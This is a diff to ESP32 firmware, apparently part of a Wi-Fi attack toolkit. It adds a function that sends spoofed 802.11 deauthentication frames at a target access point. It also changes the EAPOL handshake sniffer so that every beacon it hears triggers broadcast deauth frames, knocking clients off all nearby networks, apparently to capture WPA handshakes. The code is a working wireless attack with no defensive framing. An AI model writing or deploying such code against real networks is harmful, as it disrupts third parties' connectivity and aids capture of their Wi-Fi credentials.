@@ -840,7 +840,8 @@ void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  //esp_wifi_set_mode(WIFI_MODE_NULL);
+  esp_wifi_set_mode(WIFI_AP_STA);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
@@ -2127,6 +2128,37 @@ void WiFiScan::sendProbeAttack(uint32_t currentTime) {
   }
 }
 
+void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel) {
+  // Itterate through all access points in list
+  // Check if active
+  WiFiScan::set_channel = channel;
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+  
+  // Build packet
+  
+  deauth_frame_default[10] = bssid[0];
+  deauth_frame_default[11] = bssid[1];
+  deauth_frame_default[12] = bssid[2];
+  deauth_frame_default[13] = bssid[3];
+  deauth_frame_default[14] = bssid[4];
+  deauth_frame_default[15] = bssid[5];
+
+  deauth_frame_default[16] = bssid[0];
+  deauth_frame_default[17] = bssid[1];
+  deauth_frame_default[18] = bssid[2];
+  deauth_frame_default[19] = bssid[3];
+  deauth_frame_default[20] = bssid[4];
+  deauth_frame_default[21] = bssid[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
+}
+
 void WiFiScan::sendDeauthAttack(uint32_t currentTime) {
   // Itterate through all access points in list
   for (int i = 0; i < access_points->size(); i++) {
@@ -2214,6 +2246,45 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     int fctl = ntohs(frameControl->fctl);
     const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
     const WifiMgmtHdr *hdr = &ipkt->hdr;
+  }
+
+  // Found beacon frame. Decide whether to deauth
+  if (snifferPacket->payload[0] == 0x80) {    
+    // Build packet
+
+    uint8_t new_packet[26] = {
+                              0xc0, 0x00, 0x3a, 0x01,
+                              0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0xf0, 0xff, 0x02, 0x00
+                          };
+
+    //esp_wifi_set_mode(WIFI_AP_STA);
+
+    //delay(1);
+    
+    new_packet[10] = snifferPacket->payload[10];
+    new_packet[11] = snifferPacket->payload[11];
+    new_packet[12] = snifferPacket->payload[12];
+    new_packet[13] = snifferPacket->payload[13];
+    new_packet[14] = snifferPacket->payload[14];
+    new_packet[15] = snifferPacket->payload[15];
+  
+    new_packet[16] = snifferPacket->payload[10];
+    new_packet[17] = snifferPacket->payload[11];
+    new_packet[18] = snifferPacket->payload[12];
+    new_packet[19] = snifferPacket->payload[13];
+    new_packet[20] = snifferPacket->payload[14];
+    new_packet[21] = snifferPacket->payload[15];      
+  
+    // Send packet
+    esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
+    esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
+
+    //delay(1);
+    //esp_wifi_set_mode(WIFI_MODE_NULL);
   }
 
   if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
